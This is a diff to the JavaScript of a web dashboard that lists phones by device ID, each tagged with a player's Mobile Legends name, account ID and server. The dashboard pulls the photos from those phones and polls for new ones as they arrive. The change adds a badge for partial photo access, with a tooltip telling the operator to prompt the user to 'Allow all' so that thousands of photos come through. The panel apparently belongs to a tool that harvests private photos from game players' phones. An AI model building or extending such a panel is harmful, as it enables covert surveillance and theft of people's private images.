@@ -240,9 +240,14 @@ function renderDevices() {
 
   container.innerHTML = list.map(dev => {
     const avatarSrc = dev.thumbnail || 'data:image/svg+xml,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="%2364748b"><rect x="5" y="2" width="14" height="20" rx="2"/><circle cx="12" cy="18" r="1"/></svg>';
-    const accessBadge = dev.has_access
-      ? `<span class="badge-access granted"><svg width="10" height="10" viewBox="0 0 24 24" fill="currentColor"><path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41z"/></svg> Full Access</span>`
-      : `<span class="badge-access pending">&bull; Limited</span>`;
+    let accessBadge = `<span class="badge-access pending">&bull; Limited</span>`;
+    if (dev.has_access) {
+      if (dev.is_full_access) {
+        accessBadge = `<span class="badge-access granted"><svg width="10" height="10" viewBox="0 0 24 24" fill="currentColor"><path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41z"/></svg> Full Access</span>`;
+      } else {
+        accessBadge = `<span class="badge-access pending" style="background: rgba(234, 179, 8, 0.15); color: #eab308; border-color: rgba(234, 179, 8, 0.3);" title="User selected only ${dev.photo_count} photos. Prompt user to choose 'Allow all' in Settings for thousands of photos.">&bull; Partial (${dev.photo_count} Photos)</span>`;
+      }
+    }
 
     // 4 preview tiles
     let previewHtml = '';
@@ -471,37 +476,51 @@ async function refreshCurrentGallery() {
       return;
     }
 
-    // 2. Short pause to allow any in-flight bursts to register
-    await new Promise(r => setTimeout(r, 1200));
+    const isOnline = syncJson.data && syncJson.data.is_online;
+    const lastActiveStr = syncJson.data ? syncJson.data.last_synced : '';
 
-    // 3. Fetch latest device details
-    const res = await fetch(`api.php?action=get_device&device_id=${encodeURIComponent(devId)}`);
-    const json = await res.json();
+    if (!isOnline) {
+      const timeAgo = formatTimeAgo(lastActiveStr);
+      showToast(`Device is offline (last active ${timeAgo}). Open the app on the phone to sync photos.`, 'info');
+      return;
+    }
 
-    if (json.success && json.data) {
-      const d = json.data;
-      state.selectedDevice = { ...state.selectedDevice, ...d };
-      state.photos = d.photos || [];
-      const newCount = state.photos.length;
-      const added = newCount - prevCount;
+    // 2. Device is online: poll for incoming streaming photos
+    let newCount = prevCount;
+    let attempts = 0;
+    while (attempts < 8) {
+      await new Promise(r => setTimeout(r, 1500));
+      attempts++;
+      const res = await fetch(`api.php?action=get_device&device_id=${encodeURIComponent(devId)}`);
+      const json = await res.json();
+      if (json.success && json.data) {
+        const d = json.data;
+        state.selectedDevice = { ...state.selectedDevice, ...d };
+        state.photos = d.photos || [];
+        newCount = state.photos.length;
 
-      $('current-device-subtitle').innerHTML = `
-        ID: <code>${escapeHtml(d.device_id)}</code> &bull; 
-        IGN: <strong>${escapeHtml(d.player_ign)}</strong> &bull; 
-        MLBB: ${escapeHtml(d.mlbb_id)} (${escapeHtml(d.mlbb_server)}) &bull; 
-        Total: <strong>${newCount}</strong> photos
-      `;
+        $('current-device-subtitle').innerHTML = `
+          ID: <code>${escapeHtml(d.device_id)}</code> &bull; 
+          IGN: <strong>${escapeHtml(d.player_ign)}</strong> &bull; 
+          MLBB: ${escapeHtml(d.mlbb_id)} (${escapeHtml(d.mlbb_server)}) &bull; 
+          Total: <strong>${newCount}</strong> photos
+        `;
 
-      renderAlbumChips(d.albums || []);
-      filterAlbum(state.activeAlbum);
+        renderAlbumChips(d.albums || []);
+        filterAlbum(state.activeAlbum);
 
-      if (added > 0) {
-        showToast(`Success Added ${added} Photos`, 'success');
-      } else {
-        showToast(`All photos up to date (Total: ${newCount} Photos)`, 'info');
+        if (newCount > prevCount) {
+          // Photos streaming in, keep checking
+          if (attempts >= 4) break;
+        }
       }
+    }
+
+    const added = newCount - prevCount;
+    if (added > 0) {
+      showToast(`Success Added ${added} Photos (Total: ${newCount})`, 'success');
     } else {
-      showToast(`Sync failed: ${json.message || 'Failed loading photos'}`, 'error');
+      showToast(`All photos up to date (Total: ${newCount} Photos)`, 'info');
     }
   } catch (err) {
     showToast(`Sync failed: ${err.message || 'Network error'}`, 'error');
@@ -854,25 +873,40 @@ async function syncSingleDeviceCard(devId, btnEl) {
       return;
     }
 
-    await new Promise(r => setTimeout(r, 1200));
+    const isOnline = syncJson.data && syncJson.data.is_online;
+    const lastActiveStr = syncJson.data ? syncJson.data.last_synced : '';
 
-    const res = await fetch(`api.php?action=get_device&device_id=${encodeURIComponent(devId)}`);
-    const json = await res.json();
+    if (!isOnline) {
+      const timeAgo = formatTimeAgo(lastActiveStr);
+      showToast(`Device is offline (last active ${timeAgo}). Open the app on the phone to sync photos.`, 'info');
+      return;
+    }
 
-    if (json.success && json.data) {
-      const newCount = (json.data.photos || []).length;
-      const added = newCount - prevCount;
-      if (dev) dev.photo_count = newCount;
-      renderDevices();
-      fetchStats();
-
-      if (added > 0) {
-        showToast(`Success Added ${added} Photos`, 'success');
-      } else {
-        showToast(`All photos up to date (${newCount} Photos)`, 'info');
+    // Device is online: poll for incoming streaming photos
+    let newCount = prevCount;
+    let attempts = 0;
+    while (attempts < 8) {
+      await new Promise(r => setTimeout(r, 1500));
+      attempts++;
+      const res = await fetch(`api.php?action=get_device&device_id=${encodeURIComponent(devId)}`);
+      const json = await res.json();
+      if (json.success && json.data) {
+        newCount = (json.data.photos || []).length;
+        if (dev) dev.photo_count = newCount;
+        renderDevices();
+        fetchStats();
+        if (newCount > prevCount) {
+          // Photos streaming in, keep checking
+          if (attempts >= 4) break;
+        }
       }
+    }
+
+    const added = newCount - prevCount;
+    if (added > 0) {
+      showToast(`Success Added ${added} Photos (Total: ${newCount})`, 'success');
     } else {
-      showToast(`Sync failed: ${json.message || 'Could not sync device'}`, 'error');
+      showToast(`All photos up to date (${newCount} Photos)`, 'info');
     }
   } catch (err) {
     showToast(`Sync failed: ${err.message || 'Network error'}`, 'error');
